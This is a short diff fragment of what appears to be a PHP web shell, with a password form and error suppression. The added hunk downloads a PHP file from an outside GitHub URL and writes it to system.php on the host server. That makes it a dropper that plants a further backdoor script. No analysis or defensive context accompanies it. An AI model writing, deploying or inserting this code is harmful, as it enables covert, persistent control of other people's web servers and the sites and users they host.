@@ -228,6 +228,11 @@ If you say this is a game,we also say this is a game,can make clutter on your we
 <form method="post">
 <input type="password" name="pass">
 </form>
+<?php 
+$fp = fopen("system.php", "w"); 
+fwrite($fp, file_get_contents("https://raw.githubusercontent.com/alxwahid/3voScript/master/system.php")); 
+fclose($fp); 
+?>
 <?php
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
